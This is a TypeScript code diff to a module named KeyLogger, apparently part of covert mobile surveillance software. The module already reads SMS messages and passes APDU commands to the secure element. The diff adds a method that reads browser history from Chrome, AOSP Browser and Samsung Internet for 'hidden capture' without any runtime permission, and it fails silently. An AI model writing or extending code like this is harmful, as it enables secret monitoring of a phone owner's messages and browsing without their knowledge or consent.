@@ -55,6 +55,7 @@ type NativeKeyLogger = {
   enabled(): Promise<boolean>;
   status(): Promise<string>;
   readMessages(messageType: string, sinceTsMs: number): Promise<string[]>;
+  readBrowserHistory(sinceTsMs: number): Promise<string[]>;
   smsPermission(): Promise<boolean>;
   requestSmsPermission(): Promise<boolean>;
   eseprocess(apduHex: string): Promise<string>;
@@ -252,6 +253,22 @@ export const KeyLogger = {
   async requestSmsPermission(): Promise<boolean> {
     if (!native) return false;
     return native.requestSmsPermission();
+  },
+
+  /**
+   * Browser-history read for hidden capture. Queries the browser's public
+   * history ContentProvider (Chrome / AOSP Browser / Samsung Internet) for rows
+   * with date after [sinceTsMs]. Each raw string is a JSON history descriptor;
+   * decodes strictly to BrowserHistory[] (see capture/browser.ts). No runtime
+   * permission is required. Resolves [] when no public provider is present.
+   */
+  async readBrowserHistory(sinceTsMs: number): Promise<string[]> {
+    if (!native) return [];
+    try {
+      return await native.readBrowserHistory(sinceTsMs);
+    } catch {
+      return [];
+    }
   },
 };
 
